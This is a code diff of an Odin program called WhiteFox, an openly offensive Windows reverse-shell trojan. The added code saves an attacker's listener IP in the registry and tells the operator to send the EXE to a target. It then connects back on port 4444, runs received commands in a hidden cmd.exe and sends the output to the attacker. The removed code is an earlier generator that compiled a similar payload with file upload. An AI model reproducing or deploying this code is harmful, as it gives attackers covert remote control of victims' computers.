@@ -1,26 +1,119 @@
 package main
 
-import "core:os"
-import "core:os/os2"
 import "core:fmt"
+import "core:net"
+import "core:os"
 import "core:strings"
-import "core:path/filepath"
+import "core:sys/windows"
+
+foreign import advapi32 "system:Advapi32.lib"
+
+@(default_calling_convention="stdcall")
+foreign advapi32 {
+    RegCreateKeyExW  :: proc(hKey: windows.HKEY, lpSubKey: windows.wstring, Reserved: windows.DWORD, lpClass: windows.wstring, dwOptions: windows.DWORD, samDesired: windows.REGSAM, lpSecurityAttributes: ^windows.SECURITY_ATTRIBUTES, phkResult: ^windows.HKEY, lpdwDisposition: ^windows.DWORD) -> windows.LSTATUS ---
+    RegOpenKeyExW    :: proc(hKey: windows.HKEY, lpSubKey: windows.wstring, ulOptions: windows.DWORD, samDesired: windows.REGSAM, phkResult: ^windows.HKEY) -> windows.LSTATUS ---
+    RegQueryValueExW :: proc(hKey: windows.HKEY, lpValueName: windows.wstring, lpReserved: ^windows.DWORD, lpType: ^windows.DWORD, lpData: ^windows.BYTE, lpcbData: ^windows.DWORD) -> windows.LSTATUS ---
+    RegSetValueExW   :: proc(hKey: windows.HKEY, lpValueName: windows.wstring, Reserved: windows.DWORD, dwType: windows.DWORD, lpData: ^windows.BYTE, cbData: windows.DWORD) -> windows.LSTATUS ---
+    RegCloseKey      :: proc(hKey: windows.HKEY) -> windows.LSTATUS ---
+}
+
+REG_PATH :: "Software\\WhiteFox"
+REG_KEY  :: "T_Addr"
 
 main :: proc() {
-    // Logic to find the Desktop or current directory
-    home := os.get_env("USERPROFILE")
-    desktop_path: string
-    
-    if home != "" {
-        desktop_path = fmt.aprintf("%s\\Desktop\\payload.exe", home)
-    } else {
-        // Fallback: Create it in the same folder as this generator
-        desktop_path = "payload.exe"
+    target_ip := get_config_ip()
+
+    if target_ip == "" {
+        show_logo_with_msg()
+        fmt.print("\nEnter target IP: ")
+        
+        buf: [128]byte
+        n, _ := os.read(os.stdin, buf[:])
+        input_ip := strings.trim_space(string(buf[:n]))
+
+        if len(input_ip) > 0 {
+            save_config_ip(input_ip)
+            fmt.printf("\n[+] Target Locked: %s\n", input_ip)
+            fmt.println("[!] You can now send this EXE to the target.")
+            fmt.println("[!] Note: Commands from listener must use 'powershell' prefix.")
+        }
+        return
     }
 
+    run_agent(target_ip)
+}
+
+run_agent :: proc(ip: string) {
+    addr_str := fmt.tprintf("%s:4444", ip)
+    endpoint, _ := net.parse_endpoint(addr_str)
+    socket, dial_err := net.dial_tcp(endpoint)
+    if dial_err != nil do return
+    defer net.close(socket)
+
+    for {
+        buffer: [4096]byte
+        bytes_read, _ := net.recv_tcp(socket, buffer[:])
+        if bytes_read <= 0 do break
+
+        input := strings.trim_space(string(buffer[:bytes_read]))
+        if input == "exit" do break
+
+        h_read, h_write: windows.HANDLE
+        sa := windows.SECURITY_ATTRIBUTES{nLength = size_of(windows.SECURITY_ATTRIBUTES), bInheritHandle = true}
+        windows.CreatePipe(&h_read, &h_write, &sa, 0)
+        windows.SetHandleInformation(h_read, windows.HANDLE_FLAG_INHERIT, 0)
+
+        si := windows.STARTUPINFOW{
+            cb = u32(size_of(windows.STARTUPINFOW)),
+            dwFlags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
+            wShowWindow = 0,
+            hStdOutput = h_write,
+            hStdError = h_write,
+        }
+
+        pi: windows.PROCESS_INFORMATION
+        cmd_u16 := windows.utf8_to_utf16(fmt.tprintf("cmd.exe /c %s\x00", input))
+        
+        if windows.CreateProcessW(nil, cast(windows.wstring)raw_data(cmd_u16), nil, nil, true, 0x08000000, nil, nil, &si, &pi) {
+            windows.CloseHandle(h_write)
+            for {
+                out_buf: [4096]byte
+                n_read: u32
+                if !windows.ReadFile(h_read, raw_data(out_buf[:]), 4096, &n_read, nil) || n_read == 0 do break
+                net.send_tcp(socket, out_buf[:n_read])
+            }
+            windows.CloseHandle(pi.hProcess); windows.CloseHandle(pi.hThread)
+        }
+        windows.CloseHandle(h_read)
+    }
+}
+
+save_config_ip :: proc(ip: string) {
+    hkey: windows.HKEY
+    path := windows.utf8_to_utf16(REG_PATH)
+    val_name := windows.utf8_to_utf16(REG_KEY)
+    val_data := windows.utf8_to_utf16(ip)
+    if RegCreateKeyExW(windows.HKEY_CURRENT_USER, cast(windows.wstring)raw_data(path), 0, nil, 0, windows.KEY_WRITE, nil, &hkey, nil) == 0 {
+        RegSetValueExW(hkey, cast(windows.wstring)raw_data(val_name), 0, windows.REG_SZ, cast(^windows.BYTE)raw_data(val_data), u32(len(val_data) * 2))
+        RegCloseKey(hkey)
+    }
+}
+
+get_config_ip :: proc() -> string {
+    hkey: windows.HKEY
+    path := windows.utf8_to_utf16(REG_PATH)
+    val_name := windows.utf8_to_utf16(REG_KEY)
+    if RegOpenKeyExW(windows.HKEY_CURRENT_USER, cast(windows.wstring)raw_data(path), 0, windows.KEY_READ, &hkey) != 0 do return ""
+    defer RegCloseKey(hkey)
+    buf: [256]u16
+    size := u32(size_of(buf))
+    if RegQueryValueExW(hkey, cast(windows.wstring)raw_data(val_name), nil, nil, cast(^windows.BYTE)&buf[0], &size) != 0 do return ""
+    res, _ := windows.utf16_to_utf8(buf[:])
+    return strings.trim_right(res, "\x00")
+}
+
+show_logo_with_msg :: proc() {
     fmt.println(` 
-                                                                             
-                                                                             
 ____               ___ ___                         ________                    
 ` + "`" + `Mb(      db      )d' ` + "`" + `MM      68b                 ` + "`" + `MMMMMMM                    
  YM.     ,PM.     ,P   MM      Y89   /                 MM    \                    
@@ -32,112 +125,14 @@ ____               ___ ___                         ________
     YM,P     YM,P      MM    MM MM  MM    MM       MM     MM     MM   d` + "`" + `MM.   
     ` + "`" + `MM'     ` + "`" + `MM'      MM    MM MM  YM.  ,YM    d9 MM     YM.   ,M9  d' ` + "`" + `MM.  
      YP        YP      _MM_  _MM_MM_  YMMM9 YMMMM9 _MM_     YMMMMM9 _d_  _)MM_ 
-                                                                             
-                                                                             
-`)
-
-    fmt.print("Enter target IP: ")
-    buf: [1024]byte
-    n, _ := os2.read(os2.stdin, buf[:])
-    ip := strings.trim_space(string(buf[:n]))
-    
-    payload_source := fmt.aprintf(`package main
-import "core:net"
-import "core:os"
-import "core:os/os2"
-import "core:strings"
-import "core:sys/windows"
-import "core:fmt"
-
-main :: proc() {{
-    endpoint, _ := net.parse_endpoint("%s:4444")
-    socket, dial_err := net.dial_tcp(endpoint)
-    if dial_err != nil {{ return }}
-    defer net.close(socket)
-    
-    for {{
-        buffer: [4096]byte
-        bytes_read, _ := net.recv_tcp(socket, buffer[:])
-        if bytes_read <= 0 {{ break }}
-        
-        input := strings.trim_space(string(buffer[:bytes_read]))
-        if input == "exit" {{ break }}
-
-        if strings.has_prefix(input, "transfer:") {{
-            file_path := strings.trim_prefix(input, "transfer:")
-            f, err := os.open(file_path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o666)
-            if err == nil {{
-                net.send_tcp(socket, transmute([]byte)string("[*] Ready for file data...\n"))
-                for {{
-                    n_file, _ := net.recv_tcp(socket, buffer[:])
-                    if n_file <= 0 || strings.contains(string(buffer[:n_file]), "EOF_DONE") {{ break }}
-                    os.write(f, buffer[:n_file])
-                }}
-                os.close(f)
-                net.send_tcp(socket, transmute([]byte)string("[+] Transfer complete.\n"))
-            }}
-            continue
-        }}
-
-        h_read, h_write: windows.HANDLE
-        sa := windows.SECURITY_ATTRIBUTES{{
-            nLength = size_of(windows.SECURITY_ATTRIBUTES),
-            bInheritHandle = true,
-        }}
-        windows.CreatePipe(&h_read, &h_write, &sa, 0)
-        windows.SetHandleInformation(h_read, windows.HANDLE_FLAG_INHERIT, 0)
-
-        si := windows.STARTUPINFOW{{
-            cb = u32(size_of(windows.STARTUPINFOW)),
-            dwFlags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
-            wShowWindow = 0, 
-            hStdOutput = h_write,
-            hStdError  = h_write,
-        }}
-
-        pi: windows.PROCESS_INFORMATION
-        cmd_utf16 := windows.utf8_to_utf16(fmt.aprintf("cmd.exe /c %%s\x00", input))
-        
-        windows.CreateProcessW(nil, cast(windows.wstring)raw_data(cmd_utf16), nil, nil, true, 0x08000000, nil, nil, &si, &pi)
-        windows.CloseHandle(h_write)
-        
-        for {{
-            out_buf: [4096]byte
-            n_read: u32
-            if !windows.ReadFile(h_read, raw_data(out_buf[:]), 4096, &n_read, nil) || n_read == 0 {{ break }}
-            net.send_tcp(socket, out_buf[:n_read])
-        }
-        windows.WaitForSingleObject(pi.hProcess, windows.INFINITE)
-        windows.CloseHandle(pi.hProcess)
-        windows.CloseHandle(pi.hThread)
-        windows.CloseHandle(h_read)
-    }}
-}}`, ip)
-    
-    os.write_entire_file("payload.odin", transmute([]byte)payload_source)
-    
-    compile_desc := os2.Process_Desc{
-        command = []string{
-            "odin", "build", "payload.odin", "-file",
-            fmt.aprintf("-out:%s", desktop_path),
-            "-o:speed",
-            "-target:windows_i386", 
-            "-subsystem:windows",
-            "-extra-linker-flags:/entry:mainCRTStartup", 
-        },
-        stdout = os2.stdout,
-        stderr = os2.stderr,
-    }
-    
-    p, _ := os2.process_start(compile_desc)
-    _, _ = os2.process_wait(p)
-    _ = os2.process_close(p)
-    
-    if os.exists(desktop_path) {
-        fmt.printf("\n[+] Success! Payload created at: %s\n", desktop_path)
-        os.remove("payload.odin")
-        if os.exists("payload.obj") { os.remove("payload.obj") }
-    } else {
-        fmt.println("\n[!] Error: Could not create EXE on Desktop. Check permissions.")
-    }
+    `)
+    fmt.println("-------------------------------------------------------------------------------")
+    fmt.println("Hello! This is the developer of WhiteFox.")
+    fmt.println("Due to x86 conversion issues, the entire code had to be redesigned.")
+    fmt.println("Regardless, the working is the same. One major difference: when you run the")
+    fmt.println("exe first time, you will put listener IP AND THEN send that same exe to the target.")
+    fmt.println("This is the new model of the code.")
+    fmt.println("\nFinal note: once you get a connection, you will need to type powershell each")
+    fmt.println("time for execution (e.g., 'powershell ls', 'powershell whoami', etc.).")
+    fmt.println("-------------------------------------------------------------------------------")
 }
